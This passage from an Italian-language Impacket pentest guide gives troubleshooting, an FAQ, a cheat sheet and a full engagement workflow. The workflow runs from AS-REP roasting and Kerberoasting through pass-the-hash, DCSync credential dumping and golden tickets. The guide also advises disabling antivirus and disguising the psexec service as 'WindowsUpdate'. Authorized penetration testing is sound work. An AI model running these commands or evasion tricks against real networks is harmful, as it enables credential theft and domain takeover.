| 500      | 45 sec | 2 MB      | \~50 KB/s     |
| 5,000    | 5 min  | 20 MB     | \~70 KB/s     |
| 50,000   | 35 min | 180 MB    | \~85 KB/s     |

**Optimization:**

```bash
# Targeted dump (faster)
secretsdump.py CORP/admin:pass@dc01 -just-dc-ntlm

# vs Full dump (slower, include Kerberos keys)
secretsdump.py CORP/admin:pass@dc01
```

## Troubleshooting

### "SMB SessionError: STATUS\_ACCESS\_DENIED"

**Causa:** Credenziali invalide, user non local admin, o UAC remote restrictions.

**Diagnosi:**

```bash
# Test credentials
crackmapexec smb target -u user -p password

# Se CME → [+] ma Impacket fallisce: UAC issue
```

**Fix:**

```bash
# 1. Use Domain Admin account (bypass UAC restrictions)
psexec.py CORP/domain_admin:pass@target

# 2. Use different method
wmiexec.py CORP/user:pass@target

# 3. Disable UAC remote restrictions (richiede registry edit su target)
```

### "Kerberos SessionError: KRB\_AP\_ERR\_SKEW"

**Causa:** Time skew tra attacker e target/DC.

**Diagnosi:**

```bash
# Check time difference
date; ssh target "date"

# Se differenza > 5 minuti: problema
```

**Fix:**

```bash
# Sync time con DC
sudo ntpdate dc01.corp.local

# Oppure manual
sudo date -s "$(curl -s --head http://dc01.corp.local | grep ^Date: | sed 's/Date: //g')"
```

### secretsdump "DRSU Access Denied"

**Causa:** Account non ha DCSync rights (Replicating Directory Changes permissions).

**Diagnosi:**

```bash
# Check privileges con BloodHound o LDAP query

# Test con different user
secretsdump.py CORP/alternate_admin:pass@dc01 -just-dc-user Administrator
```

**Fix:**

* **Escalate privileges** per ottenere DA
* **Find service account con DCSync rights** (es. backup accounts)
* **Exploit ACL misconfiguration** per grant DCSync rights

### GetUserSPNs "No entries found"

**Causa:** Nessun service account con SPN configurato (raro), o domain non raggiungibile.

**Diagnosi:**

```bash
# Verify DC connectivity
ping dc01.corp.local
nmap -p88,389 dc01.corp.local

# Manual LDAP query
ldapsearch -x -H ldap://dc01 -D "user@corp.local" -w password -b "DC=corp,DC=local" "servicePrincipalName=*"
```

**Fix:**

* **Verify credentials valid**
* **Check network connectivity to DC**
* **Ensure LDAP port 389 accessible**

### psexec Uploads File But Hangs

**Causa:** Antivirus quarantine PSEXESVC.exe, o service start failed.

**Diagnosi:**

```bash
# Check service status su target (con altro accesso)
sc query PSEXESVC

# Se "STOPPED" o "NON_EXISTENT": AV blocked
```

**Fix:**

```bash
# 1. Use alternative method
wmiexec.py CORP/user:pass@target

# 2. Disable AV temporaneamente
# 3. Custom service name
psexec.py -service-name "WindowsUpdate" CORP/user:pass@target
```

## FAQ

**Impacket richiede Domain Admin per tutte le operazioni?**

No. Molti script funzionano con user standard: GetUserSPNs (kerberoasting), GetNPUsers (AS-REP roasting), psexec/wmiexec (require local admin sul target, non DA). Solo secretsdump DCSync richiede DA o equivalent privileges.

**Pass-the-hash funziona su tutti gli script Impacket?**

Quasi tutti. Flag `-hashes :NTLM` supportato da: psexec, wmiexec, smbexec, dcomexec, secretsdump, GetUserSPNs. Non supportato da: script che richiedono only Kerberos (getTGT richiede password o AES key).

**Differenza tra psexec.py e PsExec.exe (Sysinternals)?**

Funzionamento simile ma: psexec.py supporta PTH nativo, cross-platform (Linux/Mac), nessuna dipendenza Windows. PsExec.exe è binary Windows-only, richiede password plaintext, ma signed da Microsoft (meno suspicious per some AV).

**secretsdump può estrarre password plaintext?**

Sì, se presenti. Windows può cachare plaintext passwords (Wdigest) su sistemi pre-Windows 8.1. secretsdump output include sezione `.cleartext` con plaintext passwords se disponibili. Su Windows 10+ moderni: rare (Wdigest disabled per default).

**GetUserSPNs vs Rubeus per Kerberoasting?**

GetUserSPNs.py (Impacket) esegue da Linux, cross-platform, output hashcat-ready. Rubeus.exe è Windows-only, più features (monitoring, automatic ticket renewal), ma requires .NET execution su target. Per attacco da Kali: GetUserSPNs. Per attacco da Windows compromesso: Rubeus.

**Impacket è detected da EDR moderni?**

Dipende. psexec.py genera stessi artifacts di PsExec native (Event 7045, PSEXESVC binary). wmiexec.py ha detection media (process chains suspicious). secretsdump DCSync è highly monitored (Event 4662 DRSUAPI). Evasion richiede: timing attacks, Kerberos over NTLM, proxy/VPN obfuscation.

**ntlmrelayx può relay a qualsiasi target?**

No. Requisiti: SMB signing disabled sul target, target non è source (no relay back to self), credenziali admin per exploitation post-relay. In ambienti hardened: SMB signing enforced blocca relay. Alternative: relay to LDAP (non richiede SMB signing) per privilege escalation.

## Cheat Sheet

| Script             | Comando                                                | Descrizione             |
| ------------------ | ------------------------------------------------------ | ----------------------- |
| **psexec.py**      | `psexec.py DOMAIN/user:pass@target`                    | SMB lateral movement    |
|                    | `psexec.py -hashes :NTLM user@target`                  | Pass-the-hash           |
| **wmiexec.py**     | `wmiexec.py DOMAIN/user:pass@target`                   | WMI execution (stealth) |
| **smbexec.py**     | `smbexec.py DOMAIN/user:pass@target`                   | SMB exec no binary drop |
| **secretsdump.py** | `secretsdump.py DOMAIN/admin:pass@dc01`                | DCSync attack           |
|                    | `secretsdump.py -hashes :NTLM admin@dc01`              | DCSync with PTH         |
| **GetUserSPNs.py** | `GetUserSPNs.py DOMAIN/user:pass -request`             | Kerberoasting           |
| **GetNPUsers.py**  | `GetNPUsers.py DOMAIN/ -usersfile users.txt`           | AS-REP roasting         |
| **ntlmrelayx.py**  | `ntlmrelayx.py -tf targets.txt -smb2support`           | NTLM relay              |
| **getTGT.py**      | `getTGT.py DOMAIN/user:password`                       | Request Kerberos TGT    |
| **getST.py**       | `getST.py -spn cifs/target user:pass`                  | Request Service Ticket  |
| **ticketer.py**    | `ticketer.py -nthash KRBTGT_HASH -domain DOMAIN admin` | Golden ticket           |
| **lookupsid.py**   | `lookupsid.py DOMAIN/user:pass@target`                 | SID enumeration         |
| **mssqlclient.py** | `mssqlclient.py DOMAIN/user:pass@sql01`                | MSSQL client            |

**Workflow tipico engagement:**

```bash
# 1. AS-REP roasting (no creds required)
GetNPUsers.py CORP/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# 2. Con credenziali valide: Kerberoasting
GetUserSPNs.py CORP/user:cracked_password -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt

# 3. Lateral movement
psexec.py -hashes :hash CORP/svc_account@target

# 4. Privilege escalation to DA
# [exploit chain]

# 5. DCSync
secretsdump.py CORP/domain_admin:pass@dc01 -outputfile full_domain_dump

# 6. Golden ticket
ticketer.py -nthash [KRBTGT_NTLM] -domain-sid [SID] -domain CORP Administrator
export KRB5CCNAME=Administrator.ccache

# 7. Domain persistence
psexec.py -k -no-pass CORP/Administrator@dc01
```

***

**Disclaimer:** Impacket è toolkit per penetration testing autorizzato. L'utilizzo non autorizzato su reti e sistemi Windows/Active Directory costituisce reato penale (accesso abusivo art. 615-ter c.p., danneggiamento sistemi art. 635-bis c.p.). Usa esclusivamente su infrastrutture di tua proprietà o con autorizzazione scritta esplicita per penetration testing con scope definito. Repository ufficiale: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
